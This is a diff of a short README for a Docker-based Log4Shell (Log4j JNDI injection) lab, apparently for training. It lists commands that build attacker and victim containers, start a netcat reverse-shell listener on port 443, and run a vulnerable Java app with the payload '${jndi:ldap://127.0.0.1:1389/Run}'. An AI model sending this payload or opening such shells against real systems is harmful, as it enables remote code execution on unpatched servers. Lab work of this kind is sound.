@@ -1,23 +1,35 @@
 # 3204
 
-Set up Attack
-```cd log4jshell-lab/attacker
+## Set up Attack
+```
+cd log4jshell-lab/attacker
 docker-compose build 
-docker-compse up -d 
+docker-compose up -d 
 ```
 
-Start the java app
-```cd log4jshell-lab/victim/vuln-apps/others/basicJar
-
+## Start the java app
+```
+cd log4jshell-lab/victim/vuln-apps/others/basicJar
 docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
 ```
 
-Inside 
-net cat listener 
-`nc -lvnp 443`
+## In Workstation 1
+### Open Workstation Terminal
+Open 2 terminals, one for nc to listen and another ro execute exploit
+```
+sudo docker exec -it attacker-workstation1 bash
+```
+### Start net cat listener 
+```
+nc -lvnp 443
+```
 
-run exploit 
-`java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'`
+### Run exploit 
+Replace `127.0.0.1` with IP address of LDAP
+```
+cd /basicJar
+java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
+```
 
 
 
